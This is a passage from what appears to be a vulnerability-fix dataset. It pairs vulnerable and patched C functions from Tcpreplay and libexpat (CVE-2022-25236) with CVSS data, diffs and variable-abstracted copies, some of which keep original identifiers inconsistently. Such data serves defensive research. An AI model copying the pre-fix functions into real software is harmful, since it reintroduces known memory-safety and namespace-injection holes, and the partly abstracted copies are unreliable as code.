             retval = TCPEDIT_OK;","{'deleted_lines': ['            retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr);', '            retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr);'], 'added_lines': ['            retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr, l2len);', '            retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr, l2len);']}",True,Tcpreplay v4.4.1 has a heap-based buffer overflow in do_checksum_math at /tcpedit/checksum.c.,7.8,HIGH,2,valid,2022-02-11T22:37:46Z,4
CVE-2022-25236,['CWE-668'],AV:N/AC:L/Au:N/C:P/I:P/A:P,0,libexpat,lib: Fix (harmless) use of uninitialized memory,6881a4fc8596307ab9ff2e85e605afa2e413ab71,https://github.com/libexpat/libexpat/commit/6881a4fc8596307ab9ff2e85e605afa2e413ab71,expat/lib/xmlparse.c,XML_ParserCreateNS,"XML_Parser XMLCALL
XML_ParserCreateNS(const XML_Char *encodingName, XML_Char nsSep) {
XML_Char tmp[2];
*tmp = nsSep;
return XML_ParserCreate_MM(encodingName, NULL, tmp);
}","XML_Parser VAR_0
XML_ParserCreateNS(const XML_Char *VAR_1, XML_Char VAR_2) {
XML_Char VAR_3[2];
*VAR_3 = VAR_2;
return XML_ParserCreate_MM(VAR_1, NULL, VAR_3);
}",,"XML_Parser XMLCALL
XML_ParserCreateNS(const XML_Char *encodingName, XML_Char nsSep) {
  XML_Char tmp[2] = {nsSep, 0};
  return XML_ParserCreate_MM(encodingName, NULL, tmp);
}","XML_Parser VAR_0
XML_ParserCreateNS(const XML_Char *VAR_1, XML_Char VAR_2) {
  XML_Char VAR_3[2] = {VAR_2, 0};
  return XML_ParserCreate_MM(VAR_1, NULL, VAR_3);
}",,"--- func_before
+++ func_after
@@ -1,6 +1,5 @@
 XML_Parser XMLCALL
 XML_ParserCreateNS(const XML_Char *encodingName, XML_Char nsSep) {
-  XML_Char tmp[2];
-  *tmp = nsSep;
+  XML_Char tmp[2] = {nsSep, 0};
   return XML_ParserCreate_MM(encodingName, NULL, tmp);
 }","{'deleted_lines': ['  XML_Char tmp[2];', '  *tmp = nsSep;'], 'added_lines': ['  XML_Char tmp[2] = {nsSep, 0};']}",True,xmlparse.c in Expat (aka libexpat) before 2.4.5 allows attackers to insert namespace-separator characters into namespace URIs.,9.8,CRITICAL,3,valid,2022-02-11T23:19:13Z,4
CVE-2022-25236,['CWE-668'],AV:N/AC:L/Au:N/C:P/I:P/A:P,0,libexpat,lib: Fix (harmless) use of uninitialized memory,6881a4fc8596307ab9ff2e85e605afa2e413ab71,https://github.com/libexpat/libexpat/commit/6881a4fc8596307ab9ff2e85e605afa2e413ab71,expat/lib/xmlparse.c,XML_ExternalEntityParserCreate,"XML_Parser XMLCALL
XML_ExternalEntityParserCreate(XML_Parser oldParser, const XML_Char *context,
const XML_Char *encodingName) {
XML_Parser parser = oldParser;
DTD *newDtd = NULL;
DTD *oldDtd;
XML_StartElementHandler oldStartElementHandler;
XML_EndElementHandler oldEndElementHandler;
XML_CharacterDataHandler oldCharacterDataHandler;
XML_ProcessingInstructionHandler oldProcessingInstructionHandler;
XML_CommentHandler oldCommentHandler;
XML_StartCdataSectionHandler oldStartCdataSectionHandler;
XML_EndCdataSectionHandler oldEndCdataSectionHandler;
XML_DefaultHandler oldDefaultHandler;
XML_UnparsedEntityDeclHandler oldUnparsedEntityDeclHandler;
XML_NotationDeclHandler oldNotationDeclHandler;
XML_StartNamespaceDeclHandler oldStartNamespaceDeclHandler;
XML_EndNamespaceDeclHandler oldEndNamespaceDeclHandler;
XML_NotStandaloneHandler oldNotStandaloneHandler;
XML_ExternalEntityRefHandler oldExternalEntityRefHandler;
XML_SkippedEntityHandler oldSkippedEntityHandler;
XML_UnknownEncodingHandler oldUnknownEncodingHandler;
XML_ElementDeclHandler oldElementDeclHandler;
XML_AttlistDeclHandler oldAttlistDeclHandler;
XML_EntityDeclHandler oldEntityDeclHandler;
XML_XmlDeclHandler oldXmlDeclHandler;
ELEMENT_TYPE *oldDeclElementType;
void *oldUserData;
void *oldHandlerArg;
XML_Bool oldDefaultExpandInternalEntities;
XML_Parser oldExternalEntityRefHandlerArg;
#ifdef XML_DTD
enum XML_ParamEntityParsing oldParamEntityParsing;
int oldInEntityValue;
#endif
XML_Bool oldns_triplets;
unsigned long oldhash_secret_salt;
if (oldParser == NULL)
return NULL;
oldDtd = parser->m_dtd;
oldStartElementHandler = parser->m_startElementHandler;
oldEndElementHandler = parser->m_endElementHandler;
oldCharacterDataHandler = parser->m_characterDataHandler;
oldProcessingInstructionHandler = parser->m_processingInstructionHandler;
oldCommentHandler = parser->m_commentHandler;
oldStartCdataSectionHandler = parser->m_startCdataSectionHandler;
oldEndCdataSectionHandler = parser->m_endCdataSectionHandler;
oldDefaultHandler = parser->m_defaultHandler;
oldUnparsedEntityDeclHandler = parser->m_unparsedEntityDeclHandler;
oldNotationDeclHandler = parser->m_notationDeclHandler;
oldStartNamespaceDeclHandler = parser->m_startNamespaceDeclHandler;
oldEndNamespaceDeclHandler = parser->m_endNamespaceDeclHandler;
oldNotStandaloneHandler = parser->m_notStandaloneHandler;
oldExternalEntityRefHandler = parser->m_externalEntityRefHandler;
oldSkippedEntityHandler = parser->m_skippedEntityHandler;
oldUnknownEncodingHandler = parser->m_unknownEncodingHandler;
oldElementDeclHandler = parser->m_elementDeclHandler;
oldAttlistDeclHandler = parser->m_attlistDeclHandler;
oldEntityDeclHandler = parser->m_entityDeclHandler;
oldXmlDeclHandler = parser->m_xmlDeclHandler;
oldDeclElementType = parser->m_declElementType;
oldUserData = parser->m_userData;
oldHandlerArg = parser->m_handlerArg;
oldDefaultExpandInternalEntities = parser->m_defaultExpandInternalEntities;
oldExternalEntityRefHandlerArg = parser->m_externalEntityRefHandlerArg;
#ifdef XML_DTD
oldParamEntityParsing = parser->m_paramEntityParsing;
oldInEntityValue = parser->m_prologState.inEntityValue;
#endif
oldns_triplets = parser->m_ns_triplets;
oldhash_secret_salt = parser->m_hash_secret_salt;
#ifdef XML_DTD
if (! context)
newDtd = oldDtd;
#endif 
if (parser->m_ns) {
XML_Char tmp[2];
*tmp = parser->m_namespaceSeparator;
parser = parserCreate(encodingName, &parser->m_mem, tmp, newDtd);
} else {
parser = parserCreate(encodingName, &parser->m_mem, NULL, newDtd);
}
if (! parser)
return NULL;
parser->m_startElementHandler = oldStartElementHandler;
parser->m_endElementHandler = oldEndElementHandler;
parser->m_characterDataHandler = oldCharacterDataHandler;
parser->m_processingInstructionHandler = oldProcessingInstructionHandler;
parser->m_commentHandler = oldCommentHandler;
parser->m_startCdataSectionHandler = oldStartCdataSectionHandler;
parser->m_endCdataSectionHandler = oldEndCdataSectionHandler;
parser->m_defaultHandler = oldDefaultHandler;
parser->m_unparsedEntityDeclHandler = oldUnparsedEntityDeclHandler;
parser->m_notationDeclHandler = oldNotationDeclHandler;
parser->m_startNamespaceDeclHandler = oldStartNamespaceDeclHandler;
parser->m_endNamespaceDeclHandler = oldEndNamespaceDeclHandler;
parser->m_notStandaloneHandler = oldNotStandaloneHandler;
parser->m_externalEntityRefHandler = oldExternalEntityRefHandler;
parser->m_skippedEntityHandler = oldSkippedEntityHandler;
parser->m_unknownEncodingHandler = oldUnknownEncodingHandler;
parser->m_elementDeclHandler = oldElementDeclHandler;
parser->m_attlistDeclHandler = oldAttlistDeclHandler;
parser->m_entityDeclHandler = oldEntityDeclHandler;
parser->m_xmlDeclHandler = oldXmlDeclHandler;
parser->m_declElementType = oldDeclElementType;
parser->m_userData = oldUserData;
if (oldUserData == oldHandlerArg)
parser->m_handlerArg = parser->m_userData;
else
parser->m_handlerArg = parser;
if (oldExternalEntityRefHandlerArg != oldParser)
parser->m_externalEntityRefHandlerArg = oldExternalEntityRefHandlerArg;
parser->m_defaultExpandInternalEntities = oldDefaultExpandInternalEntities;
parser->m_ns_triplets = oldns_triplets;
parser->m_hash_secret_salt = oldhash_secret_salt;
parser->m_parentParser = oldParser;
#ifdef XML_DTD
parser->m_paramEntityParsing = oldParamEntityParsing;
parser->m_prologState.inEntityValue = oldInEntityValue;
if (context) {
#endif 
if (! dtdCopy(oldParser, parser->m_dtd, oldDtd, &parser->m_mem)
|| ! setContext(parser, context)) {
XML_ParserFree(parser);
return NULL;
}
parser->m_processor = externalEntityInitProcessor;
#ifdef XML_DTD
} else {
parser->m_isParamEntity = XML_TRUE;
XmlPrologStateInitExternalEntity(&parser->m_prologState);
parser->m_processor = externalParEntInitProcessor;
}
#endif 
return parser;
}","XML_Parser VAR_0
XML_ExternalEntityParserCreate(XML_Parser VAR_1, const XML_Char *VAR_2,
const XML_Char *VAR_3) {
XML_Parser VAR_4 = VAR_1;
DTD *VAR_5 = NULL;
DTD *VAR_6;
XML_StartElementHandler VAR_7;
XML_EndElementHandler VAR_8;
XML_CharacterDataHandler VAR_9;
XML_ProcessingInstructionHandler VAR_10;
XML_CommentHandler VAR_11;
XML_StartCdataSectionHandler VAR_12;
XML_EndCdataSectionHandler VAR_13;
XML_DefaultHandler VAR_14;
XML_UnparsedEntityDeclHandler VAR_15;
XML_NotationDeclHandler VAR_16;
XML_StartNamespaceDeclHandler VAR_17;
XML_EndNamespaceDeclHandler VAR_18;
XML_NotStandaloneHandler VAR_19;
XML_ExternalEntityRefHandler VAR_20;
XML_SkippedEntityHandler VAR_21;
XML_UnknownEncodingHandler VAR_22;
XML_ElementDeclHandler VAR_23;
XML_AttlistDeclHandler VAR_24;
XML_EntityDeclHandler VAR_25;
XML_XmlDeclHandler VAR_26;
ELEMENT_TYPE *VAR_27;
void *VAR_28;
void *VAR_29;
XML_Bool VAR_30;
XML_Parser VAR_31;
#ifdef VAR_32
enum XML_ParamEntityParsing VAR_33;
int VAR_34;
#endif
XML_Bool VAR_35;
unsigned long VAR_36;
if (VAR_1 == NULL)
return NULL;
VAR_6 = VAR_4->m_dtd;
VAR_7 = VAR_4->m_startElementHandler;
VAR_8 = VAR_4->m_endElementHandler;
VAR_9 = VAR_4->m_characterDataHandler;
VAR_10 = VAR_4->m_processingInstructionHandler;
VAR_11 = VAR_4->m_commentHandler;
VAR_12 = VAR_4->m_startCdataSectionHandler;
VAR_13 = VAR_4->m_endCdataSectionHandler;
VAR_14 = VAR_4->m_defaultHandler;
VAR_15 = VAR_4->m_unparsedEntityDeclHandler;
VAR_16 = VAR_4->m_notationDeclHandler;
VAR_17 = VAR_4->m_startNamespaceDeclHandler;
VAR_18 = VAR_4->m_endNamespaceDeclHandler;
VAR_19 = VAR_4->m_notStandaloneHandler;
VAR_20 = VAR_4->m_externalEntityRefHandler;
VAR_21 = VAR_4->m_skippedEntityHandler;
VAR_22 = VAR_4->m_unknownEncodingHandler;
VAR_23 = VAR_4->m_elementDeclHandler;
VAR_24 = VAR_4->m_attlistDeclHandler;
VAR_25 = VAR_4->m_entityDeclHandler;
VAR_26 = VAR_4->m_xmlDeclHandler;
VAR_27 = VAR_4->m_declElementType;
VAR_28 = VAR_4->m_userData;
VAR_29 = VAR_4->m_handlerArg;
VAR_30 = VAR_4->m_defaultExpandInternalEntities;
VAR_31 = VAR_4->m_externalEntityRefHandlerArg;
#ifdef VAR_32
VAR_33 = VAR_4->m_paramEntityParsing;
VAR_34 = VAR_4->m_prologState.inEntityValue;
#endif
VAR_35 = VAR_4->m_ns_triplets;
VAR_36 = VAR_4->m_hash_secret_salt;
#ifdef VAR_32
if (! VAR_2)
VAR_5 = VAR_6;
#endif 
if (VAR_4->m_ns) {
XML_Char VAR_37[2];
*VAR_37 = VAR_4->m_namespaceSeparator;
VAR_4 = parserCreate(VAR_3, &VAR_4->m_mem, VAR_37, VAR_5);
} else {
VAR_4 = parserCreate(VAR_3, &VAR_4->m_mem, NULL, VAR_5);
}
if (! VAR_4)
return NULL;
VAR_4->m_startElementHandler = VAR_7;
VAR_4->m_endElementHandler = VAR_8;
VAR_4->m_characterDataHandler = VAR_9;
VAR_4->m_processingInstructionHandler = VAR_10;
VAR_4->m_commentHandler = VAR_11;
VAR_4->m_startCdataSectionHandler = VAR_12;
VAR_4->m_endCdataSectionHandler = VAR_13;
VAR_4->m_defaultHandler = VAR_14;
VAR_4->m_unparsedEntityDeclHandler = VAR_15;
VAR_4->m_notationDeclHandler = VAR_16;
VAR_4->m_startNamespaceDeclHandler = VAR_17;
VAR_4->m_endNamespaceDeclHandler = VAR_18;
VAR_4->m_notStandaloneHandler = VAR_19;
VAR_4->m_externalEntityRefHandler = VAR_20;
VAR_4->m_skippedEntityHandler = VAR_21;
VAR_4->m_unknownEncodingHandler = VAR_22;
VAR_4->m_elementDeclHandler = VAR_23;
VAR_4->m_attlistDeclHandler = VAR_24;
VAR_4->m_entityDeclHandler = VAR_25;
VAR_4->m_xmlDeclHandler = VAR_26;
VAR_4->m_declElementType = VAR_27;
VAR_4->m_userData = VAR_28;
if (VAR_28 == VAR_29)
VAR_4->m_handlerArg = VAR_4->m_userData;
else
VAR_4->m_handlerArg = VAR_4;
if (VAR_31 != VAR_1)
VAR_4->m_externalEntityRefHandlerArg = VAR_31;
VAR_4->m_defaultExpandInternalEntities = VAR_30;
VAR_4->m_ns_triplets = VAR_35;
VAR_4->m_hash_secret_salt = VAR_36;
VAR_4->m_parentParser = VAR_1;
#ifdef VAR_32
VAR_4->m_paramEntityParsing = VAR_33;
VAR_4->m_prologState.inEntityValue = VAR_34;
if (VAR_2) {
#endif
if (! dtdCopy(oldParser, parser->m_dtd, oldDtd, &parser->m_mem)
|| ! setContext(VAR_4, VAR_2)) {
XML_ParserFree(VAR_4);
return NULL;
}
VAR_4->m_processor = VAR_38;
#ifdef VAR_32
} else {
VAR_4->m_isParamEntity = VAR_39;
XmlPrologStateInitExternalEntity(&VAR_4->m_prologState);
VAR_4->m_processor = VAR_40;
}
#endif 
return VAR_4;
}",,"XML_Parser XMLCALL
XML_ExternalEntityParserCreate(XML_Parser oldParser, const XML_Char *context,
                               const XML_Char *encodingName) {
  XML_Parser parser = oldParser;
  DTD *newDtd = NULL;
  DTD *oldDtd;
  XML_StartElementHandler oldStartElementHandler;
  XML_EndElementHandler oldEndElementHandler;
  XML_CharacterDataHandler oldCharacterDataHandler;
  XML_ProcessingInstructionHandler oldProcessingInstructionHandler;
  XML_CommentHandler oldCommentHandler;
  XML_StartCdataSectionHandler oldStartCdataSectionHandler;
  XML_EndCdataSectionHandler oldEndCdataSectionHandler;
  XML_DefaultHandler oldDefaultHandler;
  XML_UnparsedEntityDeclHandler oldUnparsedEntityDeclHandler;
  XML_NotationDeclHandler oldNotationDeclHandler;
  XML_StartNamespaceDeclHandler oldStartNamespaceDeclHandler;
  XML_EndNamespaceDeclHandler oldEndNamespaceDeclHandler;
  XML_NotStandaloneHandler oldNotStandaloneHandler;
  XML_ExternalEntityRefHandler oldExternalEntityRefHandler;
  XML_SkippedEntityHandler oldSkippedEntityHandler;
  XML_UnknownEncodingHandler oldUnknownEncodingHandler;
  XML_ElementDeclHandler oldElementDeclHandler;
  XML_AttlistDeclHandler oldAttlistDeclHandler;
  XML_EntityDeclHandler oldEntityDeclHandler;
  XML_XmlDeclHandler oldXmlDeclHandler;
  ELEMENT_TYPE *oldDeclElementType;

  void *oldUserData;
  void *oldHandlerArg;
  XML_Bool oldDefaultExpandInternalEntities;
  XML_Parser oldExternalEntityRefHandlerArg;
#ifdef XML_DTD
  enum XML_ParamEntityParsing oldParamEntityParsing;
  int oldInEntityValue;
#endif
  XML_Bool oldns_triplets;
  /* Note that the new parser shares the same hash secret as the old
     parser, so that dtdCopy and copyEntityTable can lookup values
     from hash tables associated with either parser without us having
     to worry which hash secrets each table has.
  */
  unsigned long oldhash_secret_salt;

  /* Validate the oldParser parameter before we pull everything out of it */
  if (oldParser == NULL)
    return NULL;

  /* Stash the original parser contents on the stack */
  oldDtd = parser->m_dtd;
  oldStartElementHandler = parser->m_startElementHandler;
  oldEndElementHandler = parser->m_endElementHandler;
  oldCharacterDataHandler = parser->m_characterDataHandler;
  oldProcessingInstructionHandler = parser->m_processingInstructionHandler;
  oldCommentHandler = parser->m_commentHandler;
  oldStartCdataSectionHandler = parser->m_startCdataSectionHandler;
  oldEndCdataSectionHandler = parser->m_endCdataSectionHandler;
  oldDefaultHandler = parser->m_defaultHandler;
  oldUnparsedEntityDeclHandler = parser->m_unparsedEntityDeclHandler;
  oldNotationDeclHandler = parser->m_notationDeclHandler;
  oldStartNamespaceDeclHandler = parser->m_startNamespaceDeclHandler;
  oldEndNamespaceDeclHandler = parser->m_endNamespaceDeclHandler;
  oldNotStandaloneHandler = parser->m_notStandaloneHandler;
  oldExternalEntityRefHandler = parser->m_externalEntityRefHandler;
  oldSkippedEntityHandler = parser->m_skippedEntityHandler;
  oldUnknownEncodingHandler = parser->m_unknownEncodingHandler;
  oldElementDeclHandler = parser->m_elementDeclHandler;
  oldAttlistDeclHandler = parser->m_attlistDeclHandler;
  oldEntityDeclHandler = parser->m_entityDeclHandler;
  oldXmlDeclHandler = parser->m_xmlDeclHandler;
  oldDeclElementType = parser->m_declElementType;

  oldUserData = parser->m_userData;
  oldHandlerArg = parser->m_handlerArg;
  oldDefaultExpandInternalEntities = parser->m_defaultExpandInternalEntities;
  oldExternalEntityRefHandlerArg = parser->m_externalEntityRefHandlerArg;
#ifdef XML_DTD
  oldParamEntityParsing = parser->m_paramEntityParsing;
  oldInEntityValue = parser->m_prologState.inEntityValue;
#endif
  oldns_triplets = parser->m_ns_triplets;
  /* Note that the new parser shares the same hash secret as the old
     parser, so that dtdCopy and copyEntityTable can lookup values
     from hash tables associated with either parser without us having
     to worry which hash secrets each table has.
  */
  oldhash_secret_salt = parser->m_hash_secret_salt;

#ifdef XML_DTD
  if (! context)
    newDtd = oldDtd;
#endif /* XML_DTD */

  /* Note that the magical uses of the pre-processor to make field
     access look more like C++ require that `parser' be overwritten
     here.  This makes this function more painful to follow than it
     would be otherwise.
  */
  if (parser->m_ns) {
    XML_Char tmp[2] = {parser->m_namespaceSeparator, 0};
    parser = parserCreate(encodingName, &parser->m_mem, tmp, newDtd);
  } else {
    parser = parserCreate(encodingName, &parser->m_mem, NULL, newDtd);
  }

  if (! parser)
    return NULL;

  parser->m_startElementHandler = oldStartElementHandler;
  parser->m_endElementHandler = oldEndElementHandler;
  parser->m_characterDataHandler = oldCharacterDataHandler;
  parser->m_processingInstructionHandler = oldProcessingInstructionHandler;
  parser->m_commentHandler = oldCommentHandler;
  parser->m_startCdataSectionHandler = oldStartCdataSectionHandler;
  parser->m_endCdataSectionHandler = oldEndCdataSectionHandler;
  parser->m_defaultHandler = oldDefaultHandler;
  parser->m_unparsedEntityDeclHandler = oldUnparsedEntityDeclHandler;
  parser->m_notationDeclHandler = oldNotationDeclHandler;
  parser->m_startNamespaceDeclHandler = oldStartNamespaceDeclHandler;
  parser->m_endNamespaceDeclHandler = oldEndNamespaceDeclHandler;
  parser->m_notStandaloneHandler = oldNotStandaloneHandler;
  parser->m_externalEntityRefHandler = oldExternalEntityRefHandler;
  parser->m_skippedEntityHandler = oldSkippedEntityHandler;
  parser->m_unknownEncodingHandler = oldUnknownEncodingHandler;
  parser->m_elementDeclHandler = oldElementDeclHandler;
  parser->m_attlistDeclHandler = oldAttlistDeclHandler;
  parser->m_entityDeclHandler = oldEntityDeclHandler;
  parser->m_xmlDeclHandler = oldXmlDeclHandler;
  parser->m_declElementType = oldDeclElementType;
  parser->m_userData = oldUserData;
  if (oldUserData == oldHandlerArg)
    parser->m_handlerArg = parser->m_userData;
  else
    parser->m_handlerArg = parser;
  if (oldExternalEntityRefHandlerArg != oldParser)
    parser->m_externalEntityRefHandlerArg = oldExternalEntityRefHandlerArg;
  parser->m_defaultExpandInternalEntities = oldDefaultExpandInternalEntities;
  parser->m_ns_triplets = oldns_triplets;
  parser->m_hash_secret_salt = oldhash_secret_salt;
  parser->m_parentParser = oldParser;
#ifdef XML_DTD
  parser->m_paramEntityParsing = oldParamEntityParsing;
  parser->m_prologState.inEntityValue = oldInEntityValue;
  if (context) {
#endif /* XML_DTD */
    if (! dtdCopy(oldParser, parser->m_dtd, oldDtd, &parser->m_mem)
        || ! setContext(parser, context)) {
      XML_ParserFree(parser);
      return NULL;
    }
    parser->m_processor = externalEntityInitProcessor;
#ifdef XML_DTD
  } else {
    /* The DTD instance referenced by parser->m_dtd is shared between the
       document's root parser and external PE parsers, therefore one does not
       need to call setContext. In addition, one also *must* not call
       setContext, because this would overwrite existing prefix->binding
       pointers in parser->m_dtd with ones that get destroyed with the external
       PE parser. This would leave those prefixes with dangling pointers.
    */
    parser->m_isParamEntity = XML_TRUE;
    XmlPrologStateInitExternalEntity(&parser->m_prologState);
    parser->m_processor = externalParEntInitProcessor;
  }
#endif /* XML_DTD */
  return parser;
}","XML_Parser VAR_0
XML_ExternalEntityParserCreate(XML_Parser VAR_1, const XML_Char *VAR_2,
                               const XML_Char *VAR_3) {
  XML_Parser VAR_4 = VAR_1;
  DTD *VAR_5 = NULL;
  DTD *VAR_6;
  XML_StartElementHandler VAR_7;
  XML_EndElementHandler VAR_8;
  XML_CharacterDataHandler VAR_9;
  XML_ProcessingInstructionHandler VAR_10;
  XML_CommentHandler VAR_11;
  XML_StartCdataSectionHandler VAR_12;
  XML_EndCdataSectionHandler VAR_13;
  XML_DefaultHandler VAR_14;
  XML_UnparsedEntityDeclHandler VAR_15;
  XML_NotationDeclHandler VAR_16;
  XML_StartNamespaceDeclHandler VAR_17;
  XML_EndNamespaceDeclHandler VAR_18;
  XML_NotStandaloneHandler VAR_19;
  XML_ExternalEntityRefHandler VAR_20;
  XML_SkippedEntityHandler VAR_21;
  XML_UnknownEncodingHandler VAR_22;
  XML_ElementDeclHandler VAR_23;
  XML_AttlistDeclHandler VAR_24;
  XML_EntityDeclHandler VAR_25;
  XML_XmlDeclHandler VAR_26;
  ELEMENT_TYPE *VAR_27;

  void *VAR_28;
  void *VAR_29;
  XML_Bool VAR_30;
  XML_Parser VAR_31;
#ifdef VAR_32
  enum XML_ParamEntityParsing VAR_33;
  int VAR_34;
#endif
  XML_Bool VAR_35;
  /* COMMENT_0 */
                                                                  
                                                                     
                                                
    
  unsigned long VAR_36;

  /* COMMENT_5 */
  if (VAR_1 == NULL)
    return NULL;

  /* COMMENT_6 */
  VAR_6 = VAR_4->m_dtd;
  VAR_7 = VAR_4->m_startElementHandler;
  VAR_8 = VAR_4->m_endElementHandler;
  VAR_9 = VAR_4->m_characterDataHandler;
  VAR_10 = VAR_4->m_processingInstructionHandler;
  VAR_11 = VAR_4->m_commentHandler;
  VAR_12 = VAR_4->m_startCdataSectionHandler;
  VAR_13 = VAR_4->m_endCdataSectionHandler;
  VAR_14 = VAR_4->m_defaultHandler;
  VAR_15 = VAR_4->m_unparsedEntityDeclHandler;
  VAR_16 = VAR_4->m_notationDeclHandler;
  VAR_17 = VAR_4->m_startNamespaceDeclHandler;
  VAR_18 = VAR_4->m_endNamespaceDeclHandler;
  VAR_19 = VAR_4->m_notStandaloneHandler;
  VAR_20 = VAR_4->m_externalEntityRefHandler;
  VAR_21 = VAR_4->m_skippedEntityHandler;
  VAR_22 = VAR_4->m_unknownEncodingHandler;
  VAR_23 = VAR_4->m_elementDeclHandler;
  VAR_24 = VAR_4->m_attlistDeclHandler;
  VAR_25 = VAR_4->m_entityDeclHandler;
  VAR_26 = VAR_4->m_xmlDeclHandler;
  VAR_27 = VAR_4->m_declElementType;

  VAR_28 = VAR_4->m_userData;
  VAR_29 = VAR_4->m_handlerArg;
  VAR_30 = VAR_4->m_defaultExpandInternalEntities;
  VAR_31 = VAR_4->m_externalEntityRefHandlerArg;
#ifdef VAR_32
  VAR_33 = VAR_4->m_paramEntityParsing;
  VAR_34 = VAR_4->m_prologState.inEntityValue;
#endif
  VAR_35 = VAR_4->m_ns_triplets;
  /* COMMENT_7 */
                                                                  
                                                                     
                                                
    
  VAR_36 = VAR_4->m_hash_secret_salt;

#ifdef VAR_32
  if (! VAR_2)
    VAR_5 = VAR_6;
#endif /* COMMENT_12 */

  /* COMMENT_13 */
                                                                   
                                                                   
                        
    
  if (VAR_4->m_ns) {
    XML_Char VAR_37[2] = {VAR_4->m_namespaceSeparator, 0};
    VAR_4 = parserCreate(VAR_3, &VAR_4->m_mem, VAR_37, VAR_5);
  } else {
    VAR_4 = parserCreate(VAR_3, &VAR_4->m_mem, NULL, VAR_5);
  }

  if (! VAR_4)
    return NULL;

  VAR_4->m_startElementHandler = VAR_7;
  VAR_4->m_endElementHandler = VAR_8;
  VAR_4->m_characterDataHandler = VAR_9;
  VAR_4->m_processingInstructionHandler = VAR_10;
  VAR_4->m_commentHandler = VAR_11;
  VAR_4->m_startCdataSectionHandler = VAR_12;
  VAR_4->m_endCdataSectionHandler = VAR_13;
  VAR_4->m_defaultHandler = VAR_14;
  VAR_4->m_unparsedEntityDeclHandler = VAR_15;
  VAR_4->m_notationDeclHandler = VAR_16;
  VAR_4->m_startNamespaceDeclHandler = VAR_17;
  VAR_4->m_endNamespaceDeclHandler = VAR_18;
  VAR_4->m_notStandaloneHandler = VAR_19;
  VAR_4->m_externalEntityRefHandler = VAR_20;
  VAR_4->m_skippedEntityHandler = VAR_21;
  VAR_4->m_unknownEncodingHandler = VAR_22;
  VAR_4->m_elementDeclHandler = VAR_23;
  VAR_4->m_attlistDeclHandler = VAR_24;
  VAR_4->m_entityDeclHandler = VAR_25;
  VAR_4->m_xmlDeclHandler = VAR_26;
  VAR_4->m_declElementType = VAR_27;
  VAR_4->m_userData = VAR_28;
  if (VAR_28 == VAR_29)
    VAR_4->m_handlerArg = VAR_4->m_userData;
  else
    VAR_4->m_handlerArg = VAR_4;
  if (VAR_31 != VAR_1)
    VAR_4->m_externalEntityRefHandlerArg = VAR_31;
  VAR_4->m_defaultExpandInternalEntities = VAR_30;
  VAR_4->m_ns_triplets = VAR_35;
  VAR_4->m_hash_secret_salt = VAR_36;
  VAR_4->m_parentParser = VAR_1;
#ifdef VAR_32
  VAR_4->m_paramEntityParsing = VAR_33;
  VAR_4->m_prologState.inEntityValue = VAR_34;
  if (VAR_2) {
#endif/* COMMENT_18 */
    if (! dtdCopy(oldParser, parser->m_dtd, oldDtd, &parser->m_mem)
        || ! setContext(VAR_4, VAR_2)) {
      XML_ParserFree(VAR_4);
      return NULL;
    }
    VAR_4->m_processor = VAR_38;
#ifdef VAR_32
  } else {
    /* COMMENT_19 */
                                                                             
                                                                     
                                                                        
                                                                               
                                                                         
      
    VAR_4->m_isParamEntity = VAR_39;
    XmlPrologStateInitExternalEntity(&VAR_4->m_prologState);
    VAR_4->m_processor = VAR_40;
  }
#endif /* COMMENT_12 */
  return VAR_4;
}",,"--- func_before
+++ func_after
@@ -97,8 +97,7 @@
      would be otherwise.
   */
   if (parser->m_ns) {
-    XML_Char tmp[2];
-    *tmp = parser->m_namespaceSeparator;
+    XML_Char tmp[2] = {parser->m_namespaceSeparator, 0};
     parser = parserCreate(encodingName, &parser->m_mem, tmp, newDtd);
   } else {
     parser = parserCreate(encodingName, &parser->m_mem, NULL, newDtd);","{'deleted_lines': ['    XML_Char tmp[2];', '    *tmp = parser->m_namespaceSeparator;'], 'added_lines': ['    XML_Char tmp[2] = {parser->m_namespaceSeparator, 0};']}",True,xmlparse.c in Expat (aka libexpat) before 2.4.5 allows attackers to insert namespace-separator characters into namespace URIs.,9.8,CRITICAL,3,valid,2022-02-11T23:19:13Z,4
CVE-2022-25236,['CWE-668'],AV:N/AC:L/Au:N/C:P/I:P/A:P,0,libexpat,lib: Protect against malicious namespace declarations (CVE-2022-25236),a2fe525e660badd64b6c557c2b1ec26ddc07f6e4,https://github.com/libexpat/libexpat/commit/a2fe525e660badd64b6c557c2b1ec26ddc07f6e4,expat/lib/xmlparse.c,addBinding,"static enum XML_Error
addBinding(XML_Parser parser, PREFIX *prefix, const ATTRIBUTE_ID *attId,
const XML_Char *uri, BINDING **bindingsPtr) {
static const XML_Char xmlNamespace[]
= {ASCII_h,      ASCII_t,     ASCII_t,     ASCII_p,      ASCII_COLON,
ASCII_SLASH,  ASCII_SLASH, ASCII_w,     ASCII_w,      ASCII_w,
ASCII_PERIOD, ASCII_w,     ASCII_3,     ASCII_PERIOD, ASCII_o,
ASCII_r,      ASCII_g,     ASCII_SLASH, ASCII_X,      ASCII_M,
ASCII_L,      ASCII_SLASH, ASCII_1,     ASCII_9,      ASCII_9,
ASCII_8,      ASCII_SLASH, ASCII_n,     ASCII_a,      ASCII_m,
ASCII_e,      ASCII_s,     ASCII_p,     ASCII_a,      ASCII_c,
ASCII_e,      '\0'};
static const int xmlLen = (int)sizeof(xmlNamespace) / sizeof(XML_Char) - 1;
static const XML_Char xmlnsNamespace[]
= {ASCII_h,     ASCII_t,      ASCII_t, ASCII_p, ASCII_COLON,  ASCII_SLASH,
ASCII_SLASH, ASCII_w,      ASCII_w, ASCII_w, ASCII_PERIOD, ASCII_w,
ASCII_3,     ASCII_PERIOD, ASCII_o, ASCII_r, ASCII_g,      ASCII_SLASH,
ASCII_2,     ASCII_0,      ASCII_0, ASCII_0, ASCII_SLASH,  ASCII_x,
ASCII_m,     ASCII_l,      ASCII_n, ASCII_s, ASCII_SLASH,  '\0'};
static const int xmlnsLen
= (int)sizeof(xmlnsNamespace) / sizeof(XML_Char) - 1;
XML_Bool mustBeXML = XML_FALSE;
XML_Bool isXML = XML_TRUE;
XML_Bool isXMLNS = XML_TRUE;
BINDING *b;
int len;
if (*uri == XML_T('\0') && prefix->name)
return XML_ERROR_UNDECLARING_PREFIX;
if (prefix->name && prefix->name[0] == XML_T(ASCII_x)
&& prefix->name[1] == XML_T(ASCII_m)
&& prefix->name[2] == XML_T(ASCII_l)) {
